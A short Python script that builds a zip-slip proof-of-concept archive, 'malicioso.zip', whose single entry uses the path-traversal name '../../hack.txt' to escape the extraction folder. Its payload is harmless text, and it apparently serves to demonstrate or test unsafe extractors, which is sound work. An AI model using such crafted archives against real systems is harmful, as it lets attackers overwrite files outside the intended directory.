import zipfile

with zipfile.ZipFile("malicioso.zip", "w") as z:
    z.writestr("../../hack.txt", "conteudo malicioso")
